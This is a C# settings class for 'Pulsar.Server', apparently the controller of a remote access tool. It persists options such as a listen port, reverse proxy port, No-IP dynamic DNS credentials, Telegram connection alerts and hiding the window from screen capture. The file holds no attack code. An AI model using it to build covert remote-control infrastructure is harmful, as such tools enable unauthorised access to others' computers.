using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace Pulsar.Server.Models
{
    public static class Settings
    {
        private static readonly string PulsarStuffDir = Path.Combine(Application.StartupPath, "PulsarStuff");
        private static readonly string SettingsPath = Path.Combine(PulsarStuffDir, "settings.json");
        private static SettingsModel _settings;
        private static readonly object _lockObject = new object();

        public static readonly string CertificatePath = Path.Combine(PulsarStuffDir, "Pulsar.p12");

        private static bool _isDarkMode()
        {
            int res = -1;
            try
            {
                res = (int)Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize", "AppsUseLightTheme", -1);
            }
            catch { }

            if (res == 0)
            {
                return true;
            }
            else if (res == 1)
            {
                return false;
            }
            else
            {
                return false;
            }
        }

        private static SettingsModel LoadSettings()
        {
            if (_settings != null)
                return _settings;

            lock (_lockObject)
            {
                if (_settings != null)
                    return _settings;

                try
                {
                    if (File.Exists(SettingsPath))
                    {
                        string json = File.ReadAllText(SettingsPath);
                        _settings = JsonConvert.DeserializeObject<SettingsModel>(json) ?? new SettingsModel();
                    }
                    else
                    {
                        _settings = new SettingsModel();
                        // Set system-detected dark mode as default
                        _settings.DarkMode = _isDarkMode();
                        SaveSettings();
                    }
                }
                catch
                {
                    _settings = new SettingsModel();
                    // Set system-detected dark mode as default
                    _settings.DarkMode = _isDarkMode();
                }

                return _settings;
            }
        }

        private static void SaveSettings()
        {
            lock (_lockObject)
            {
                try
                {
                    if (!Directory.Exists(PulsarStuffDir))
                    {
                        Directory.CreateDirectory(PulsarStuffDir);
                    }
                    string json = JsonConvert.SerializeObject(_settings, Newtonsoft.Json.Formatting.Indented);
                    File.WriteAllText(SettingsPath, json);
                }
                catch
                {
                    // Ignore save errors
                }
            }
        }

        public static bool DarkMode
        {
            get
            {
                return LoadSettings().DarkMode;
            }
            set
            {
                LoadSettings().DarkMode = value;
                SaveSettings();
            }
        }

        public static bool HideFromScreenCapture
        {
            get
            {
                return LoadSettings().HideFromScreenCapture;
            }
            set
            {
                LoadSettings().HideFromScreenCapture = value;
                SaveSettings();
            }
        }

        public static bool DiscordRPC
        {
            get { return LoadSettings().DiscordRPC; }
            set 
            { 
                LoadSettings().DiscordRPC = value;
                SaveSettings();
            }
        }

        public static ushort ListenPort
        {
            get
            {
                return LoadSettings().ListenPort;
            }
            set
            {
                LoadSettings().ListenPort = value;
                SaveSettings();
            }
        }

        public static bool IPv6Support
        {
            get
            {
                return LoadSettings().IPv6Support;
            }
            set
            {
                LoadSettings().IPv6Support = value;
                SaveSettings();
            }
        }

        public static bool AutoListen
        {
            get
            {
                return LoadSettings().AutoListen;
            }
            set            {
                LoadSettings().AutoListen = value;
                SaveSettings();
            }
        }

        public static bool EventLog
        {
            get
            {
                return LoadSettings().EventLog;
            }
            set
            {
                LoadSettings().EventLog = value;
                SaveSettings();
            }
        }

        public static bool TelegramNotifications
        {
            get
            {
                return LoadSettings().TelegramNotifications;
            }
            set
            {
                LoadSettings().TelegramNotifications = value;
                SaveSettings();
            }
        }

        public static bool ShowPopup
        {
            get
            {
                return LoadSettings().ShowPopup;
            }
            set
            {
                LoadSettings().ShowPopup = value;
                SaveSettings();
            }
        }

        public static bool UseUPnP
        {
            get
            {
                return LoadSettings().UseUPnP;
            }
            set
            {
                LoadSettings().UseUPnP = value;
                SaveSettings();
            }
        }

        public static bool ShowToolTip
        {
            get
            {
                return LoadSettings().ShowToolTip;
            }
            set
            {
                LoadSettings().ShowToolTip = value;
                SaveSettings();
            }
        }

        public static bool EnableNoIPUpdater
        {
            get
            {
                return LoadSettings().EnableNoIPUpdater;
            }
            set
            {
                LoadSettings().EnableNoIPUpdater = value;
                SaveSettings();
            }
        }

        public static string TelegramChatID
        {
            get
            {
                return LoadSettings().TelegramChatID;
            }
            set
            {
                LoadSettings().TelegramChatID = value;
                SaveSettings();
            }
        }

        public static string TelegramBotToken
        {
            get
            {
                return LoadSettings().TelegramBotToken;
            }
            set
            {
                LoadSettings().TelegramBotToken = value;
                SaveSettings();
            }
        }

        public static string NoIPHost
        {
            get
            {
                return LoadSettings().NoIPHost;
            }
            set
            {
                LoadSettings().NoIPHost = value;
                SaveSettings();
            }
        }

        public static string NoIPUsername
        {
            get
            {
                return LoadSettings().NoIPUsername;
            }
            set
            {
                LoadSettings().NoIPUsername = value;
                SaveSettings();
            }
        }

        public static string NoIPPassword
        {
            get
            {
                return LoadSettings().NoIPPassword;
            }
            set
            {
                LoadSettings().NoIPPassword = value;
                SaveSettings();
            }
        }

        public static string SaveFormat
        {
            get
            {
                return LoadSettings().SaveFormat;
            }
            set
            {
                LoadSettings().SaveFormat = value;
                SaveSettings();
            }
        }

        public static ushort ReverseProxyPort
        {
            get
            {
                return LoadSettings().ReverseProxyPort;
            }
            set
            {
                LoadSettings().ReverseProxyPort = value;
                SaveSettings();
            }
        }

        public static bool AllowLocalhost
        {
            get
            {
                return LoadSettings().AllowLocalhost;
            }
            set
            {
                LoadSettings().AllowLocalhost = value;
                SaveSettings();
            }
        }
    }
}
